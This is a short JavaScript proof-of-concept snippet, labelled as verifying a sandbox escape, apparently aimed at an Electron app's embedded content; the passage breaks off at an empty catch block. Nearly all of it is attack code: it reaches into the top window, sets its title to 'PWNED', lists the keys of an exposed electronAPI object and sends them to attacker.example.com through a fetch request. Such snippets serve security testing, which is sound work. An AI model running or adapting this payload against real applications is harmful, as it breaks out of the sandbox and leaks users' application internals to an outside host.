// Verify sandbox escape:
try {
  window.top.document.title = 'PWNED';
  const exposed = Object.keys(window.top.electronAPI || window.top);
  fetch('https://attacker.example.com/exfil?data=' + encodeURIComponent(JSON.stringify(exposed)));
} catch(e) {
